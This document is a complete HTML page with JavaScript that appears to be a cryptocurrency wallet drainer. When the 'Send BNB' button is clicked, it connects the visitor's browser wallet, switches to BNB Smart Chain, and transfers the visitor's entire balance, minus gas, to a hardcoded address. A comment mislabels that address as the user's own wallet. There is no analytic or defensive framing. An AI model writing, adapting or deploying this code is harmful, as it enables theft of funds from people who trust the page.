
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BNB Auto Transfer</title>
</head>
<body>
  <div style="padding: 20px; text-align: center;">
    <h2>BNB Auto Transfer</h2>
    <button id="sendButton" style="padding: 15px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Send BNB</button>
    <div id="status" style="margin-top: 20px; padding: 10px; background: #f8f9fa; border-radius: 5px;"></div>
  </div>

  <script>
    const receiverAddress = '0x70d459946ccea3CAC19ca79c9E40ea291625fAf8'; // User wallet address

    function updateStatus(message, isError = false) {
      const status = document.getElementById('status');
      status.innerHTML = message;
      status.style.color = isError ? 'red' : 'green';
      console.log(message);
    }

    document.getElementById('sendButton').addEventListener('click', async () => {
      updateStatus('Starting transaction process...');

      if (!window.ethereum) {
        updateStatus('Please install MetaMask or Trust Wallet!', true);
        return;
      }

      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAccount = accounts[0];
        updateStatus(`Connected: ${userAccount.substring(0,6)}...${userAccount.substring(38)}`);

        let chainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (chainId !== '0x38') {
          updateStatus('Switching to BNB Smart Chain...');
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }],
            });
          } catch (switchError) {
            if (switchError.code === 4902) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x38',
                  chainName: 'BNB Smart Chain',
                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/']
                }],
              });
            } else {
              throw switchError;
            }
          }
          chainId = await window.ethereum.request({ method: 'eth_chainId' });
          if (chainId !== '0x38') {
            updateStatus('Please manually switch to BNB Smart Chain', true);
            return;
          }
        }

        updateStatus('Checking balance...');
        const balanceHex = await window.ethereum.request({
          method: 'eth_getBalance',
          params: [userAccount, 'latest']
        });
        
        const balanceWei = BigInt(balanceHex);
        const gasLimit = 21000n;
        const gasPrice = 5000000000n;
        const gasCost = gasLimit * gasPrice;

        if (balanceWei <= gasCost) {
          updateStatus('Not enough BNB to cover gas fees.', true);
          return;
        }

        const valueToSend = balanceWei - gasCost;
        const sendAmountEth = parseFloat(valueToSend.toString()) / Math.pow(10, 18);
        updateStatus(`Sending ${sendAmountEth.toFixed(6)} BNB...`);

        const txParams = {
          from: userAccount,
          to: receiverAddress,
          value: '0x' + valueToSend.toString(16),
          gas: '0x' + gasLimit.toString(16),
          gasPrice: '0x' + gasPrice.toString(16)
        };

        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [txParams],
        });

        updateStatus(`âœ… Success! Transaction Hash: ${txHash}`);
        alert(`Transaction Successful!\nAmount: ${sendAmountEth.toFixed(6)} BNB\nTo: ${receiverAddress}\nHash: ${txHash}`);

      } catch (error) {
        console.error('Error:', error);
        let errorMsg = 'Transaction failed';
        if (error.code === 4001) errorMsg = 'Transaction rejected by user';
        else if (error.code === -32000 && error.message.includes('insufficient')) errorMsg = 'Insufficient funds';
        else if (error.message) errorMsg = `Error: ${error.message.substring(0, 100)}`;
        updateStatus(errorMsg, true);
        alert(errorMsg);
      }
    });

    document.getElementById('sendButton').addEventListener('mouseover', function() {
      this.style.background = '#0056b3';
    });
    
    document.getElementById('sendButton').addEventListener('mouseout', function() {
      this.style.background = '#007bff';
    });
  </script>
</body>
</html>
